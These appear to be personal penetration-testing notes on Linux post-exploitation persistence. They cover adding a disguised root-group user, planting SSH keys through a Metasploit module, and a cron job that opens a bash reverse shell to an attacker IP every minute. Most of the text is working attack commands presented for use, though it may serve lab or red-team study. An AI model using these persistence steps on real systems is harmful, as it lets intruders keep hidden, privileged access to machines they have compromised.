![](</Images/Pasted image 20240107202811.png>)

Create new user once root. Obfuscate the name to look like a service account. Add to root group `usermod -aG root <new user>`

## Persistence via SSH

Persistence options
`search platform:linux persistence`

Good one to add ssh keys to compromised machines
`exploit/linux/manage_sshkey_persistence`

After logging on copy private key <- chmod 400 after copy

## Persistence via Cronjobs
Set up cronjob to start connection
```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attack ip> 0>&1'" > cron
```

To add to cronjob: `crontab -i cron`
Then create listener with the above info and wait for job to run

